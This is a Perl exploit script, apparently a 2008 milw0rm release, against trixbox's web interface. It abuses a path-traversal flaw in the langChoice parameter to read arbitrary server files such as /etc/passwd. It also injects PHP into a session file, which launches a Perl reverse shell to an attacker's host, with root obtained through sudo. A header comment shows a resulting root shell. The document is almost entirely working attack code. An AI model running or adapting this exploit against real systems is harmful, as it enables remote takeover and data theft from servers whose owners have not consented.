#!/usr/bin/perl -w

# Jean-Michel BESNARD <jmbesnard@gmail.com> / LEXSI Audit
# 2008-07-09
# This is an update of the previous exploit. We can now get a root shell, thanks to sudo.
#
# perl trixbox_fi_v2.pl 192.168.1.212
# Please listen carefully as our menu option has changed
# Choose from the following options:
#     1> Remote TCP shell
#     2> Read local file
# 1
# Host and port the reverse shell should connect to ? (<host>:<port>): 192.168.1.132:4444
# Which uid would you like for your shell ? (uid=root will be OK on most recent trixbox versions only): [root|asterisk]
# root
# Make sure you've opened a server socket on port 4444 at 192.168.1.132 (e.g, nc -l -p 4444)
# Press enter to continue...
# done...

# nc -l -v -p 4444
# listening on [any] 4444 ...
# connect to [192.168.1.132] from lexsi-abo-new.lexsi.com [192.168.1.212] 48397
# bash: no job control in this shell
# bash-3.1# id
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
# bash-3.1# 


use strict;
use Switch;
use LWP::UserAgent;
use HTTP::Cookies;

usage() unless @ARGV;
my $url = "http://$ARGV[0]/user/index.php";
my $ua = LWP::UserAgent->new;
my $cookie_jar = HTTP::Cookies->new;
$ua->cookie_jar($cookie_jar);

menu();

sub execScript{
    my $scriptCode = shift;
    post($scriptCode);
    my $phpsessionid = extractPHPSID($cookie_jar->as_string);
    post("langChoice=../../../../../../../../../../tmp/sess_$phpsessionid%00");
}

sub post{
    my $postData = shift;
    my $req = HTTP::Request->new(POST => $url);
    $req->content_type('application/x-www-form-urlencoded');
    $req->content($postData);
    my $res = $ua->request($req);
    my $content = $res->content;
    return $content;
}

sub readFile{
    my $file = shift;
    my $content = post("langChoice=../../../../../../../../../..$file%00");
    my @fileLines = split(/\n/,$content);
    my $fileContent = "Content of $file: \n\n";
    for(my $i=3;$i<@fileLines;$i++){
	last if($fileLines[$i] =~ m/trixbox - User Mode/);
	$fileContent = $fileContent . $fileLines[$i-3] . "\n";
    }
    return $fileContent;
}

sub tcp_reverse_shell{
    my $rhost= shift;
    my $rport = shift;
    my $uid = shift;
    my $rshell;
    if($uid eq "asterisk"){
	$rshell = "langChoice=<?php `/usr/bin/perl -MSocket -e '\\\$p=fork;exit,if(\\\$p);socket(S, PF_INET, SOCK_STREAM, getprotobyname('tcp'));connect(S, sockaddr_in($rport,inet_aton(\"$rhost\")));open(STDIN, \">%26S\");open(STDOUT,\">%26S\");open(STDERR,\">%26S\");exec({\"/bin/sh\"} (\"JMB\", \"-i\"));'`;?>%00";

    }else{
	$rshell = "langChoice=<?php `/usr/bin/perl -MSocket -e '\\\$p=fork;exit,if(\\\$p);socket(S, PF_INET, SOCK_STREAM, getprotobyname('tcp'));connect(S, sockaddr_in($rport,inet_aton(\"$rhost\")));open(STDIN, \">%26S\");open(STDOUT,\">%26S\");open(STDERR,\">%26S\");exec(\"/usr/bin/sudo\",\"/bin/bash\", (\"-i\"));'`;?>%00";
    }
    execScript($rshell);
}


sub extractPHPSID{
    $_ = shift;
    if(/PHPSESSID=(\w+)/){
	return $1;
    } 
}

sub menu{
    print <<EOF;
Please listen carefully as our menu option has changed
Choose from the following options:
    1> Remote TCP shell
    2> Read local file
EOF
    my $option = <STDIN>;
    chop($option);
    switch($option){
	case 1 {
	    print "Host and port the reverse shell should connect to ? ";
	    print "(<host>:<port>): ";
	    my $hp=<STDIN>;
	    chop($hp);
	    print "Which uid would you like for your shell ? (uid=root will be OK on most recent trixbox versions only): [root|asterisk]";
	    my $uid=<STDIN>;
	    chop($uid);
	    my($rhost,$rport) = split(/:/,$hp);
	    print "Make sure you've opened a server socket on port $rport at $rhost (e.g, nc -l -p $rport)\n";
	    print "Press enter to continue...";
	    <STDIN>;
	    tcp_reverse_shell($rhost,$rport,$uid);
	    print "done...\n";
	    }
	case 2 {
	    while(1){
		print "Full path (e.g. /etc/passwd): ";
		my $file = <STDIN>;
		chop($file);
		print readFile($file) . "\n\n";
	    }
	}
    }
}

sub usage{
    print "./trixbox_fi.pl <host>\n";
    exit 1;
}

# milw0rm.com [2008-07-09]
